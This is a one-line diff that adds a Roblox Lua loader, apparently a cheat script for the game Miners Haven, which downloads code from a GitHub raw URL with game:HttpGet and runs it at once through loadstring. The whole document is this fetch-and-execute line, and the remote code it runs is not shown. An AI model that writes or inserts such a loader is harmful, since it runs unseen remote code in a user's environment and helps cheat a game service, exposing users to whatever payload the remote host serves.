@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BlueaqeR/scripts-lol/main/MinersHavenT", true))()
